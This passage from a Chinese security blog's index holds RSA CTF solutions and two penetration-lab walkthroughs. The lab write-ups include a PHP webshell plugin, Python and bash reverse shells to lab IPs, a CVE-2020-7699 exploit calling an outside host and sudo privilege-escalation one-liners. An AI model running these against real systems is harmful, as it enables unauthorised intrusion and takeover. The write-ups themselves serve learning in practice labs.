key.decrypt(c)\rprint(flag)\r","date":"2021-10-15","objectID":"/2021-10-15-rsa%E7%BB%83%E4%B9%A0%E8%A1%A5/:9:0","tags":["CTF","密码学"],"title":"RSA练习▪补","uri":"/2021-10-15-rsa%E7%BB%83%E4%B9%A0%E8%A1%A5/"},{"categories":["WriteUp"],"content":"0x09 [BJDCTF2020]easyrsa from Crypto.Util.number import getPrime,bytes_to_long from sympy import Derivative from fractions import Fraction from secret import flag p=getPrime(1024) q=getPrime(1024) e=65537 n=p*q z=Fraction(1,Derivative(arctan(p),p))-Fraction(1,Derivative(arth(q),q)) m=bytes_to_long(flag) c=pow(m,e,n) print(c,z,n) ''' output: 7922547866857761459807491502654216283012776177789511549350672958101810281348402284098310147796549430689253803510994877420135537268549410652654479620858691324110367182025648788407041599943091386227543182157746202947099572389676084392706406084307657000104665696654409155006313203957292885743791715198781974205578654792123191584957665293208390453748369182333152809882312453359706147808198922916762773721726681588977103877454119043744889164529383188077499194932909643918696646876907327364751380953182517883134591810800848971719184808713694342985458103006676013451912221080252735948993692674899399826084848622145815461035 32115748677623209667471622872185275070257924766015020072805267359839059393284316595882933372289732127274076434587519333300142473010344694803885168557548801202495933226215437763329280242113556524498457559562872900811602056944423967403777623306961880757613246328729616643032628964072931272085866928045973799374711846825157781056965164178505232524245809179235607571567174228822561697888645968559343608375331988097157145264357626738141646556353500994924115875748198318036296898604097000938272195903056733565880150540275369239637793975923329598716003350308259321436752579291000355560431542229699759955141152914708362494482 15310745161336895413406690009324766200789179248896951942047235448901612351128459309145825547569298479821101249094161867207686537607047447968708758990950136380924747359052570549594098569970632854351825950729752563502284849263730127586382522703959893392329333760927637353052250274195821469023401443841395096410231843592101426591882573405934188675124326997277775238287928403743324297705151732524641213516306585297722190780088180705070359469719869343939106529204798285957516860774384001892777525916167743272419958572055332232056095979448155082465977781482598371994798871917514767508394730447974770329967681767625495394441 ''' 这个n其实可以分解p,q直接解出了。但这里照旧分析下z，Fraction(a,b) 相当于 a/b，Derivative(f(x),x) : 当x=‘x’时,f(x)的导数值。arctan的导数是1/(1+p2)，arth的导数是1/(1-q2)。两者相减，得到p2+q2，知道n，很容易求出p,q。 pqplus = gmpy2.iroot(z+2*n,2)[0]\rpqminus = gmpy2.iroot(z-2*n,2)[0]\rp = (pqminus+pqplus)//2\rq = (pqplus-pqminus)//2\r","date":"2021-10-15","objectID":"/2021-10-15-rsa%E7%BB%83%E4%B9%A0%E8%A1%A5/:10:0","tags":["CTF","密码学"],"title":"RSA练习▪补","uri":"/2021-10-15-rsa%E7%BB%83%E4%B9%A0%E8%A1%A5/"},{"categories":["WriteUp"],"content":"0x0A [BJDCTF2020]rsa_output 共模攻击。 ","date":"2021-10-15","objectID":"/2021-10-15-rsa%E7%BB%83%E4%B9%A0%E8%A1%A5/:11:0","tags":["CTF","密码学"],"title":"RSA练习▪补","uri":"/2021-10-15-rsa%E7%BB%83%E4%B9%A0%E8%A1%A5/"},{"categories":["WriteUp"],"content":"0x0B [NPUCTF2020]EzRSA from gmpy2 import lcm , powmod , invert , gcd , mpz from Crypto.Util.number import getPrime from sympy import nextprime from random import randint p = getPrime(1024) q = getPrime(1024) n = p * q gift = lcm(p - 1 , q - 1) e = 54722 flag = b'NPUCTF{******************}' m = int.from_bytes(flag , 'big') c = powmod(m , e , n) print('n: ' , n) print('gift: ' , gift) print('c: ' , c) #n: 17083941230213489700426636484487738282426471494607098847295335339638177583685457921198569105417734668692072727759139358207667248703952436680183153327606147421932365889983347282046439156176685765143620637107347870401946946501620531665573668068349080410807996582297505889946205052879002028936125315312256470583622913646319779125559691270916064588684997382451412747432722966919513413709987353038375477178385125453567111965259721484997156799355617642131569095810304077131053588483057244340742751804935494087687363416921314041547093118565767609667033859583125275322077617576783247853718516166743858265291135353895239981121 #gift: 2135492653776686212553329560560967285303308936825887355911916917454772197960682240149821138177216833586509090969892419775958406087994054585022894165950768427741545736247918410255804894522085720642952579638418483800243368312702566458196708508543635051350999572787188236243275631609875253617015664414032058822919469443284453403064076232765024248435543326597418851751586308514540124571309152787559712950209357825576896132278045112177910266019741013995106579484868768251084453338417115483515132869594712162052362083414163954681306259137057581036657441897428432575924018950961141822554251369262248368899977337886190114104 #c: 3738960639194737957667684143565005503596276451617922474669745529299929395507971435311181578387223323429323286927370576955078618335757508161263585164126047545413028829873269342924092339298957635079736446851837414357757312525158356579607212496060244403765822636515347192211817658170822313646743520831977673861869637519843133863288550058359429455052676323196728280408508614527953057214779165450356577820378810467527006377296194102671360302059901897977339728292345132827184227155061326328585640019916328847372295754472832318258636054663091475801235050657401857262960415898483713074139212596685365780269667500271108538319 lcm返回的是最小公倍数，这里我的解法是gift与n的值相差1个十进制位，k*gift=(p-1)*(q-1)=p*q-(p+q)+1=n- (p+q)+1，而k*gift的值是小于n的，这里可以用简单的循环算出k的值，然后求出p+q，再进一步推算出p、q。 for i in range(2,10):\rif i*gift \u003en:\rk = i-1\rbreak\rpqplus = n +1- k*gift\rqminus = gmpy2.isqrt(pqplus**2-4*n)\re值不是素数，可以进行一下转换。 所以代码如下： e = 54722//2\rd = gmpy2.invert(e,phi)\rm = pow(c,d,n)\rprint (long_to_bytes(gmpy2.isqrt(m)))\r还可以从二进制位数推断出gift的二进制位数为2045，phi的位数为2048，因此gcd(p−1,q−1)占3bits，因此最大公因数的范围（十进制）为[4,8]。参考https://www.cnblogs.com/vict0r/p/13723450.html for gcd_val in range(4, 8):\rphi = gift * gcd_val\rtry:\rd = gmpy2.invert(e // 2, phi)\rm_2 = pow(c, int(d), n)\rflag = long_to_bytes(gmpy2.isqrt(m_2))\rprint(flag)\rexcept ZeroDivisionError:\rcontinue ","date":"2021-10-15","objectID":"/2021-10-15-rsa%E7%BB%83%E4%B9%A0%E8%A1%A5/:12:0","tags":["CTF","密码学"],"title":"RSA练习▪补","uri":"/2021-10-15-rsa%E7%BB%83%E4%B9%A0%E8%A1%A5/"},{"categories":["安全技术"],"content":"\r","date":"2021-10-13","objectID":"/2021-10-13-%E6%89%93%E9%9D%B6-admx_new/:0:0","tags":["渗透测试","Web安全"],"title":"打靶-AdmX_new","uri":"/2021-10-13-%E6%89%93%E9%9D%B6-admx_new/"},{"categories":["安全技术"],"content":"0x00 准备工作 难度等级: 中 打靶目标: 取得 2 个 flag + root 权限 涉及攻击方法: 主机发现 端口扫描 WEB路径爆破 BurpSuite内容替换 密码爆破 MSF漏洞利用 WordPress后台漏洞利用 升级Full TTY终端 蚁剑上线 利用MySQL提权 ","date":"2021-10-13","objectID":"/2021-10-13-%E6%89%93%E9%9D%B6-admx_new/:1:0","tags":["渗透测试","Web安全"],"title":"打靶-AdmX_new","uri":"/2021-10-13-%E6%89%93%E9%9D%B6-admx_new/"},{"categories":["安全技术"],"content":"0x01 信息搜集 扫描靶机端口，发现在80上开启了apache服务. 打开是默认页面。 然后通过feroxbuster工具来进行目录扫描，扫描结果发现，wordpress目录存在301跳转。 ","date":"2021-10-13","objectID":"/2021-10-13-%E6%89%93%E9%9D%B6-admx_new/:2:0","tags":["渗透测试","Web安全"],"title":"打靶-AdmX_new","uri":"/2021-10-13-%E6%89%93%E9%9D%B6-admx_new/"},{"categories":["安全技术"],"content":"0x02 目标渗透 尝试访问，然而加载的速度异常缓慢。 打开网络能发现浏览器请求了192.168.159.145的资源。 抓包发现dns-prefetch的ip被硬编码为192.168.159.145。 在bp的proxy-\u003eOption-\u003eMatch and Replace添加如下图的规则，然后 页面资源能够成功加载了，查看里面的内容，发现存在admin用户，再加上之前扫目录出来的/wordpress/admin，感觉可能是个后台。 访问一下，可以看到有登录的页面，然后使用bp来对密码进行一个爆破，得到密码为adam14，进入后台。 ","date":"2021-10-13","objectID":"/2021-10-13-%E6%89%93%E9%9D%B6-admx_new/:3:0","tags":["渗透测试","Web安全"],"title":"打靶-AdmX_new","uri":"/2021-10-13-%E6%89%93%E9%9D%B6-admx_new/"},{"categories":["安全技术"],"content":"0x04 GetShell WordPress提权的下手角度： Media–通过Media，可以向目标服务器上传文件。 Appearence–编辑当前主题的php源码，对404模板进行代码注入。 Plugins–Add New以worldpress的插件上传webshell或者编辑原有的插件。 这里可以上传插件，代码如下： \u003c?php\r/**\rPlugin Name: webshell\rPlugin URI: https://www.baidu.com/\rDescription: webshell\rVersion: 1.0\rAuthor: lion\rAuthor URI: https://www.baidu.com/\rLicense: https://www.baidu.com/\r*/\rif(isset($_GET['cmd']))\r{\rsystem($_GET['cmd']);\r}\r?\u003e\r然后使用zip -r shell.zip shell.php将文件压缩成zip格式，上传安装，木马插件的路径为/wordpress/wp-content/plugins/shell.php。然后使用python反弹shell。 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.92.129\",2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'\r还可以用msf提权。 use exploit/unix/webapp/wp_admin_shell_upload\rset rhosts 192.168.92.135\rset username admin\rset password adam14\rset targeturi /wordpress\rrun\r能达到同样的效果。 先ls /bin/bash查看kali上面是否有/bin/bash，再echo $SHELL查看当前的shell，如果默认的shell是zsh，可通过chsh -s /bin/bash切换，再重启即可。准备就绪后，按ctrl + z，将获取到的shell放入后台，输入下列的命令升级成完全交互式的shell。 stty raw -echo\rfg\rls\rexport SHELL=/bin/bash\rexport TERM=screen\rstty rows 38 columns 116\rreset\r然后编辑当前主题的php源码，插入一句话木马后，用蚁剑连接。 ","date":"2021-10-13","objectID":"/2021-10-13-%E6%89%93%E9%9D%B6-admx_new/:4:0","tags":["渗透测试","Web安全"],"title":"打靶-AdmX_new","uri":"/2021-10-13-%E6%89%93%E9%9D%B6-admx_new/"},{"categories":["安全技术"],"content":"0x05 flag1 尝试读取local.txt，并没有权限。 查看wp-config配置文件，发现数据库的用户名密码。 尝试用该密码切换用户、进入数据库，结果失败，用之前登录后台的密码，成功切换用户。 接着访问local.txt，成功！ ","date":"2021-10-13","objectID":"/2021-10-13-%E6%89%93%E9%9D%B6-admx_new/:5:0","tags":["渗透测试","Web安全"],"title":"打靶-AdmX_new","uri":"/2021-10-13-%E6%89%93%E9%9D%B6-admx_new/"},{"categories":["安全技术"],"content":"0x06 flag2 sudo -l 发现mysql可以不用root密码以root权限执行 然后在数据库中使用system id，确实是root的权限。 使用\\! /bin/bash切换到root，\\!为system的简化。 ","date":"2021-10-13","objectID":"/2021-10-13-%E6%89%93%E9%9D%B6-admx_new/:6:0","tags":["渗透测试","Web安全"],"title":"打靶-AdmX_new","uri":"/2021-10-13-%E6%89%93%E9%9D%B6-admx_new/"},{"categories":["安全技术"],"content":"\r","date":"2021-10-12","objectID":"/2021-10-12-%E6%89%93%E9%9D%B6-chronos/:0:0","tags":["渗透测试","Web安全"],"title":"打靶-Chronos","uri":"/2021-10-12-%E6%89%93%E9%9D%B6-chronos/"},{"categories":["安全技术"],"content":"0x00 准备工作 难度等级: 中 打靶目标: 取得 2 个 flag + root 权限 涉及攻击方法: 端口扫描 WEB侦查 命令注入 数据编解码 搜索大法 框架漏洞利用 代码审计 NC串联 本地提权 ","date":"2021-10-12","objectID":"/2021-10-12-%E6%89%93%E9%9D%B6-chronos/:1:0","tags":["渗透测试","Web安全"],"title":"打靶-Chronos","uri":"/2021-10-12-%E6%89%93%E9%9D%B6-chronos/"},{"categories":["安全技术"],"content":"0x01 flag1 主机扫描，使用netdiscover -r 10.0.2.0/24，-r指定ip段。 再进行端口扫描 Nikto是一个开源的WEB扫描评估软件，可以对Web服务器进行多项安全测试，具体的使用参考https://zhuanlan.zhihu.com/p/124246499。使用nikto -h 10.0.2.7，扫描详细的web服务信息。Express是基于 Node.js 平台，快速、开放、极简的 Web 开发框架。 下面访问下80端口的web服务 查看下源代码，21行的js代码很可疑，不过可以看到这些函数的字符经过处理了。 jsbeautify得到一条url地址，chrons.local怀疑是靶机的域名，再刷新下web页面，发现Permission Denied。 format后面的字符串看起来也像是base加密过的，放到cyberchef里面用magic跑一下，发现是base58加密的，然后格式很类似date命令。%A 表示星期，%B : 月份，%d表示日，%Y表示年，%H表示小时，%M表示分钟，%S表示秒。 下面修改/etc/hosts后再次访问。 构造;bash -c 'bash -i \u003e\u0026 /dev/tcp/10.0.2.4/2333 0\u003e\u00261'经过base58加密后，用bp抓包改包。 虽然爆出了错误提示信息，但shell是已经连上的。 接着进行代码审计，package.json记录当前项目所依赖模块的版本信息，package-lock.json记录了node_modules目录下所有模块的具体来源和版本号以及其他的信息，app.js是项目的入口文件，node_modules是安装node后用来存放用包管理工具下载安装的包的文件夹。chronos文件夹中没有找到相关的漏洞利用点，跳到opt目录，发现同级下存在 chronos-v2文件夹。 跳进去看一下，backend是后端，frontend是前端，index.html是首页，看下后端的代码。 发现存在一个文件上传的东西 经过查找需要用到CVE-2020-7699，参考：https://www.bleepingcomputer.com/news/security/nodejs-module-downloaded-7m-times-lets-hackers-inject-code/?cf_chl_jschl_tk=pmd_is5dI67SGF84oBx7VNrHKtOJkiFLfvwseT0ZXR2iQG8-1633955732-0-gqNtZGzNAlCjcnBszQbR、https://blog.csdn.net/systemino/article/details/108099675、https://blog.p6.is/Real-World-JS-1/，且前提条件是启用\"parseNested\"选项，这里查看server.js的源码。 满足条件，然后，找到的exp代码如下： import requests\rcmd = 'bash -c \"bash -i \u0026\u003e /dev/tcp/p6.is/8888 0\u003e\u00261\"'\r# pollute\rrequests.post('http://p6.is:7777', files = {'__proto__.outputFunctionName': (\rNone, f\"x;console.log(1);process.mainModule.require('child_process').exec('{cmd}');x\")})\r# execute command\rrequests.get('http://p6.is:7777')\r上传到服务器，修改权限，运行反弹shell。 查看user.txt ","date":"2021-10-12","objectID":"/2021-10-12-%E6%89%93%E9%9D%B6-chronos/:2:0","tags":["渗透测试","Web安全"],"title":"打靶-Chronos","uri":"/2021-10-12-%E6%89%93%E9%9D%B6-chronos/"},{"categories":["安全技术"],"content":"0x02 flag2 在Linux系统上进行提权通常有3种： 通过内核漏洞提权 suid的权限配置不当 sudo权限配置不严谨 这次在sudo时，发现可疑点，可以在不需要密码的情况下运行npm和node命令。 然后搜索一下node.js提权的代码。 sudo node -e 'child_process.spawn(\"/bin/bash\", {stdio: [0, 1, 2]})'\r成功提权！ 接着查看下root.txt ","date":"2021-10-12","objectID":"/2021-10-12-%E6%89%93%E9%9D%B6-chronos/:3:0","tags":["渗透测试","Web安全"],"title":"打靶-Chronos","uri":"/2021-10-12-%E6%89%93%E9%9D%B6-chronos/"},{"categories":["WriteUp"],"content":"0x00 RSA1 p = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229 q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469 dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929 dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041 c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852 这道题泄露了dp和dq，分析参考自https://blog.csdn.net/xiao_han_a/article/details/118516038?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-1.no_search_link\u0026spm=1001.2101.3001.4242、https://blog.csdn.net/weixin_44110537/article/details/106739798 dp=d%(p-1)\rdq=d%(q-1)\rm=c\u003csup\u003ed\u003c/sup\u003e+k*n=c\u003csup\u003ed\u003c/sup\u003e+k*p*q 分别同时对q,p取余得\rm1=c\u003csup\u003ed\u003c/sup\u003e%p\rm2=c\u003csup\u003ed\u003c/sup\u003e%q\rm1+k*p=c\u003csup\u003ed\u003c/sup\u003e\rm2=(m1+k*p)%q\rk*p≡(m1-m2)%q\ri为p(mod q)的逆元\rk≡i(m1-m2)(mod q)\rc\u003csup\u003ed\u003c/sup\u003e=m1+(i(m1-m2)%q )*p\rm = c\u003csup\u003ed\u003c/sup\u003e % n= (m1+(i(m1-m2)%q )*p) % n\r代码如下： import gmpy2\rn = p*q\rI = gmpy2.invert(p, q) #I为p(mod q)的逆元，即p*I = 1(mod q)\rmp = gmpy2.powmod(c, dp, p) #计算mp = c^dp % p\rmq = gmpy2.powmod(c, dq, q) #计算mq = c^dq % q m = (mp + (I * (mq - mp)) * p) % n #明文求解公式\rm = hex(m)[2:] #转十六进制数据\rflag = ''\rfor i in range(len(m)//2):\rflag += chr(int(m[i*2:(i+1)*2], 16))\rprint(flag)\r","date":"2021-10-11","objectID":"/2021-10-11-rsa%E7%BB%83%E4%B9%A0/:1:0","tags":["CTF","密码学"],"title":"RSA练习","uri":"/2021-10-11-rsa%E7%BB%83%E4%B9%A0/"},{"categories":["WriteUp"],"content":"0x01 RSA2 e = 65537 n = 248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113 dp = 905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657 c = 140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751 dp泄露，原理参考https://blog.csdn.net/weixin_45369385/article/details/109208109?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-4.no_search_link\u0026depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-4.no_search_link 代码如下： import gmpy2 for x in range(1, e):\rif(e*dp%x == 1):\rp = (e*dp-1)//x+1\rif(n%p != 0):\rcontinue\rq = n//p\rphin = (p-1)*(q-1)\rd = gmpy2.invert(e, phin)\rm = gmpy2.powmod(c, d, n)\rprint(\"flag:\",bytes.fromhex(hex(m)[2:]))\r","date":"2021-10-11","objectID":"/2021-10-11-rsa%E7%BB%83%E4%B9%A0/:2:0","tags":["CTF","密码学"],"title":"RSA练习","uri":"/2021-10-11-rsa%E7%BB%83%E4%B9%A0/"},{"categories":["WriteUp"],"content":"0x02 [WUSTCTF2020]babyrsa c = 28767758880940662779934612526152562406674613203406706867456395986985664083182\rn = 73069886771625642807435783661014062604264768481735145873508846925735521695159\re = 65537\rn分解为189239861511125143212536989589123569301和386123125371923651191219869811293586459。 代码如下 import gmpy2\rfrom Crypto.Util.number import long_to_bytes\rphi = (p-1)*(q-1)\rd = gmpy2.invert(e,phi)\rm = pow(c,d,n)\rprint (long_to_bytes(m))\r","date":"2021-10-11","objectID":"/2021-10-11-rsa%E7%BB%83%E4%B9%A0/:3:0","tags":["CTF","密码学"],"title":"RSA练习","uri":"/2021-10-11-rsa%E7%BB%83%E4%B9%A0/"},{"categories":["WriteUp"],"content":"0x03 [GUET-CTF2019]BabyRSA p+q : 0x1232fecb92adead91613e7d9ae5e36fe6bb765317d6ed38ad890b4073539a6231a6620584cea5730b5af83a3e80cf30141282c97be4400e33307573af6b25e2ea (p+1)(q+1) : 0x5248becef1d925d45705a7302700d6a0ffe5877fddf9451a9c1181c4d82365806085fd86fbaab08b6fc66a967b2566d743c626547203b34ea3fdb1bc06dd3bb765fd8b919e3bd2cb15bc175c9498f9d9a0e216c2dde64d81255fa4c05a1ee619fc1fc505285a239e7bc655ec6605d9693078b800ee80931a7a0c84f33c851740 e : 0xe6b1bee47bd63f615c7d0a43c529d219 d : 0x2dde7fbaed477f6d62838d55b0d0964868cf6efb2c282a5f13e6008ce7317a24cb57aec49ef0d738919f47cdcd9677cd52ac2293ec5938aa198f962678b5cd0da344453f521a69b2ac03647cdd8339f4e38cec452d54e60698833d67f9315c02ddaa4c79ebaa902c605d7bda32ce970541b2d9a17d62b52df813b2fb0c5ab1a5 enc_flag : 0x50ae00623211ba6089ddfae21e204ab616f6c9d294e913550af3d66e85d0c0693ed53ed55c46d8cca1d7c2ad44839030df26b70f22a8567171a759b76fe5f07b3c5a6ec89117ed0a36c0950956b9cde880c575737f779143f921d745ac3bb0e379c05d9a3cc6bf0bea8aa91e4d5e752c7eb46b2e023edbc07d24a7c460a34a9a n = (p+1)*(q+1) - (p+q) - 1，代码如下： import libnum\rn = b-a-1\rm = pow(c,d,n)\rprint(libnum.n2s(m)) #（n2s将数值转化为字符串）\r","date":"2021-10-11","objectID":"/2021-10-11-rsa%E7%BB%83%E4%B9%A0/:4:0","tags":["CTF","密码学"],"title":"RSA练习","uri":"/2021-10-11-rsa%E7%BB%83%E4%B9%A0/"},{"categories":["WriteUp"],"content":"0x04 RSAROLL 题目 RSA roll！roll！roll！\rOnly number and a-z\r（don't use editor\rwhich MS provide）\r{920139713,19}\r704796792\r752211152\r274704164\r18414022\r368270835\r483295235\r263072905\r459788476\r483295235\r459788476\r663551792\r475206804\r459788476\r428313374\r475206804\r459788476\r425392137\r704796792\r458265677\r341524652\r483295235\r534149509\r425392137\r428313374\r425392137\r341524652\r458265677\r263072905\r483295235\r828509797\r341524652\r425392137\r475206804\r428313374\r483295235\r475206804\r459788476\r306220148\r{920139713,19} 所代表的是n和e，由此，分解n能得到p、q为18443、49891。参考https://blog.csdn.net/MikeCoke/article/details/106146568的脚本 import gmpy2\rN,p,q,e=920139713,18443,49891,19\rd=gmpy2.invert(e,(p-1)*(q-1))\rresult=[]\rwith open(\"data.txt\",\"r\") as f:#删掉data.txt的前两行\rfor line in f.readlines():\rline=line.strip('\\n')#去掉列表中每一个元素的换行符\rresult.append(chr(pow(int(line),d,N)))\rfor i in result:\rprint(i,end='')\r","date":"2021-10-11","objectID":"/2021-10-11-rsa%E7%BB%83%E4%B9%A0/:5:0","tags":["CTF","密码学"],"title":"RSA练习","uri":"/2021-10-11-rsa%E7%BB%83%E4%B9%A0/"},{"categories":["WriteUp"],"content":"0x05 [HDCTF2019]basic rsa import gmpy2\rfrom Crypto.Util.number import *\rfrom binascii import a2b_hex,b2a_hex\rflag = \"*****************\"\rp = 262248800182277040650192055439906580479\rq = 262854994239322828547925595487519915551\re = 65533\rn = p*q\rc = pow(int(b2a_hex(flag),16),e,n)\rprint c\r# 27565231154623519221597938803435789010285480123476977081867877272451638645710\r代码如下 import gmpy2\rfrom Crypto.Util.number import long_to_bytes\rphi = (p-1)*(q-1)\rd = gmpy2.invert(e,phi)\rn = p*q\rm = pow(c,d,n)\rprint (long_to_bytes(m))\r","date":"2021-10-11","objectID":"/2021-10-11-rsa%E7%BB%83%E4%B9%A0/:6:0","tags":["CTF","密码学"],"title":"RSA练习","uri":"/2021-10-11-rsa%E7%BB%83%E4%B9%A0/"},{"categories":["WriteUp"],"content":"0x06 rsa pub.key如下 -----BEGIN PUBLIC KEY-----\rMDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMAzLFxkrkcYL2wch21CM2kQVFpY9+7+\r/AvKr1rzQczdAgMBAAE=\r-----END PUBLIC KEY-----\rflag.enc 4196 c059 4a5e 000a 96b8 78b6 7cd7 2479\r5b13 a8f2 ca54 da06 d0f1 9c28 be68 9b62\r参考https://blog.csdn.net/weixin_30607659/article/details/101533319?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163387389216780274195015%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D\u0026request_id=163387389216780274195015\u0026biz_id=0\u0026utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-3-101533319.pc_search_result_cache\u0026utm_term=buu+rsa4\u0026spm=1018.2226.3001.4187 pub.key是公钥，flag.enc是rsa加密后的文件，因此我们只要通过公钥文件解析出n,e,p,q,d，再利用脚本解密rsa加密文件。在http://tool.chacuo.net/cryptrsakeyparse对公钥进行解析，提取e,n。 然后将n转10进制后，得86934482296048119190666062003494800588905656017203025617216654058378322103517分解p、q得285960468890451637935629440372639283459、304008741604601924494328155975272418463。 代码如下 import gmpy2\rimport rsa\rphin = (q-1)*(p-1)\rd = gmpy2.invert(e, phin)\rkey = rsa.PrivateKey(n, e, int(d), p, q)\rwith open(\"flag.enc\", \"rb+\") as f:\rf = f.read()\rprint(rsa.decrypt(f, key))\r","date":"2021-10-11","objectID":"/2021-10-11-rsa%E7%BB%83%E4%B9%A0/:7:0","tags":["CTF","密码学"],"title":"RSA练习","uri":"/2021-10-11-rsa%E7%BB%83%E4%B9%A0/"},{"categories":["WriteUp"],"content":"0x07 [NCTF2019]childRSA from random import choice from Crypto.Util.number import isPrime, sieve_base as primes from flag import flag def getPrime(bits): while True: n = 2 while n.bit_length() \u003c bits: n *= choice(primes) if isPrime(n + 1): return n + 1 e = 0x10001 m = int.from_bytes(flag.encode(), 'big') p, q = [getPrime(2048) for _ in range(2)] n = p * q c = pow(m, e, n) # n = 32849718197337581823002243717057659218502519004386996660885100592872201948834155543125924395614928962750579667346279456710633774501407292473006312537723894221717638059058796679686953564471994009285384798450493756900459225040360430847240975678450171551048783818642467506711424027848778367427338647282428667393241157151675410661015044633282064056800913282016363415202171926089293431012379261585078566301060173689328363696699811123592090204578098276704877408688525618732848817623879899628629300385790344366046641825507767709276622692835393219811283244303899850483748651722336996164724553364097066493953127153066970594638491950199605713033004684970381605908909693802373826516622872100822213645899846325022476318425889580091613323747640467299866189070780620292627043349618839126919699862580579994887507733838561768581933029077488033326056066378869170169389819542928899483936705521710423905128732013121538495096959944889076705471928490092476616709838980562233255542325528398956185421193665359897664110835645928646616337700617883946369110702443135980068553511927115723157704586595844927607636003501038871748639417378062348085980873502535098755568810971926925447913858894180171498580131088992227637341857123607600275137768132347158657063692388249513 # c = 26308018356739853895382240109968894175166731283702927002165268998773708335216338997058314157717147131083296551313334042509806229853341488461087009955203854253313827608275460592785607739091992591431080342664081962030557042784864074533380701014585315663218783130162376176094773010478159362434331787279303302718098735574605469803801873109982473258207444342330633191849040553550708886593340770753064322410889048135425025715982196600650740987076486540674090923181664281515197679745907830107684777248532278645343716263686014941081417914622724906314960249945105011301731247324601620886782967217339340393853616450077105125391982689986178342417223392217085276465471102737594719932347242482670320801063191869471318313514407997326350065187904154229557706351355052446027159972546737213451422978211055778164578782156428466626894026103053360431281644645515155471301826844754338802352846095293421718249819728205538534652212984831283642472071669494851823123552827380737798609829706225744376667082534026874483482483127491533474306552210039386256062116345785870668331513725792053302188276682550672663353937781055621860101624242216671635824311412793495965628876036344731733142759495348248970313655381407241457118743532311394697763283681852908564387282605279108 题目给出了n，c，e，但难点在于分解n = p * q，sieve_base是包含了前10000个素数的列表，choice() 方法返回一个列表，元组或字符串的随机项。这里引入费马小定理。参考https://blog.csdn.net/xiao_han_a/article/details/118670716?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163387505416780366545618%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D\u0026request_id=163387505416780366545618\u0026biz_id=0\u0026utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-3-118670716.pc_search_result_cache\u0026utm_term=%5BNCTF2019%5DchildRSA\u0026spm=1018.2226.3001.4187 若b为一个素数，则对于任意整数a，有a(b-1) = 1 (mod b)\r拓展可得ak*(b-1) - 1是b的倍数，而(p-1)和(q-1)由前10000个素数中的若干个素数相乘得到，前10000个素数的乘积记为∏，令∏ = k*(p-1)，由费马小定理，有2∏-1 = ak*(p-1)-1是p的倍数，gcd(2∏-1, n) = p，得到p，但是直接计算2∏计算量会很大，所以再进一步优化。 2∏ = 1 (mod p)，即2∏ = 1 + k1*p\r而2∏ % n = 2∏ - k2n = 2∏ - k2pq\r两边同时% p，有2∏ % n = 2∏ (mod p)\r所以同样有2∏ % n = 1 (mod p)\r现在只用计算2∏ (mod n)，模幂计算会比直接幂计算快很多 代码如下 import gmpy2\rimport binascii\rfrom Crypto.Util.number import isPrime, sieve_base as primes\r#primes为前10000个素数的列表\r#计算prd = ∏ primes\rprd = 1\rfor i in primes:\rprd *= i\r#p为(2^prd-1)和n的公约数\rp = gmpy2.gcd(gmpy2.powmod(2,prd,n)-1,n)\rq = n // p\rd = gmpy","date":"2021-10-11","objectID":"/2021-10-11-rsa%E7%BB%83%E4%B9%A0/:8:0","tags":["CTF","密码学"],"title":"RSA练习","uri":"/2021-10-11-rsa%E7%BB%83%E4%B9%A0/"},{"categories":["WriteUp"],"content":"0x08 RSA4 N = 331310324212000030020214312244232222400142410423413104441140203003243002104333214202031202212403400220031202142322434104143104244241214204444443323000244130122022422310201104411044030113302323014101331214303223312402430402404413033243132101010422240133122211400434023222214231402403403200012221023341333340042343122302113410210110221233241303024431330001303404020104442443120130000334110042432010203401440404010003442001223042211442001413004 c = 310020004234033304244200421414413320341301002123030311202340222410301423440312412440240244110200112141140201224032402232131204213012303204422003300004011434102141321223311243242010014140422411342304322201241112402132203101131221223004022003120002110230023341143201404311340311134230140231412201333333142402423134333211302102413111111424430032440123340034044314223400401224111323000242234420441240411021023100222003123214343030122032301042243 N = 302240000040421410144422133334143140011011044322223144412002220243001141141114123223331331304421113021231204322233120121444434210041232214144413244434424302311222143224402302432102242132244032010020113224011121043232143221203424243134044314022212024343100042342002432331144300214212414033414120004344211330224020301223033334324244031204240122301242232011303211220044222411134403012132420311110302442344021122101224411230002203344140143044114 c = 112200203404013430330214124004404423210041321043000303233141423344144222343401042200334033203124030011440014210112103234440312134032123400444344144233020130110134042102220302002413321102022414130443041144240310121020100310104334204234412411424420321211112232031121330310333414423433343322024400121200333330432223421433344122023012440013041401423202210124024431040013414313121123433424113113414422043330422002314144111134142044333404112240344 N = 